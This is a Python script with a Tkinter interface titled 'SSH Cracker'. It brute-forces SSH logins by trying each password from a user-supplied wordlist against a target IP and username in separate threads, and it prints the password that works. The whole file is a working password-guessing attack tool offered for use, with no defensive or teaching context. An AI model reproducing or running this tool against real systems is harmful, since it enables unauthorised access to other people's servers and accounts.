#!/usr/bin/python3
from tkinter import *
import paramiko, sys, os, termcolor
import threading, time

stop_flag = 0
count = 0
message = ""

frame = Tk()

frame.title("SSH Cracker")
frame.geometry('600x400')

targetlbl = Label(frame, text='Enter the target IP: ')
targetlbl.grid(column=0, row=2)
targettxt = Entry(frame, width=20)
targettxt.grid(column=1, row=2)

accountlbl = Label(frame, text='Enter the SSH username: ')
accountlbl.grid(column=0, row=4)
accounttxt = Entry(frame, width=20)
accounttxt.grid(column=1, row=4)

wordlistlbl = Label(frame, text='Enter the path to wordlist: ')
wordlistlbl.grid(column=0, row=6)
wordlisttxt = Entry(frame, width=20)
wordlisttxt.grid(column=1, row=6)

output = Text(frame, wrap=WORD, width=30, height=15)
output.grid(column=0, row=10)

def ssh_connect(password,host,username):
    global stop_flag, count, message
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        message = '[+] Found Password: ' + password + ', For Account: ' + username + '\n'
        print(termcolor.colored((message), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()

def clicked():
    global stop_flag, message
    stop_flag = 0
    message = ""
    input_file = wordlisttxt.get()
    host = targettxt.get()
    username = accounttxt.get()
    if os.path.exists(input_file) == False:
        output.insert(END, '[!!] That File/Path Does Not Exist')
        output.update()
        print('[!!] That File/Path Does Not Exist')
        sys.exit(1)

    output.insert(END, '* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' * * *\n')
    output.update()
    print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' * * *\n')


    with open(input_file, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file.readlines():
            if stop_flag == 1:
                t.join()
                output.insert(END, message)
                output.update()
                break
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(password,host,username,))
            output.insert(END, message)
            output.update()
            t.start()
            time.sleep(0.5)

submit = Button(frame, text='Begin', command=clicked)
submit.grid(column=2, row=8)

frame.mainloop()
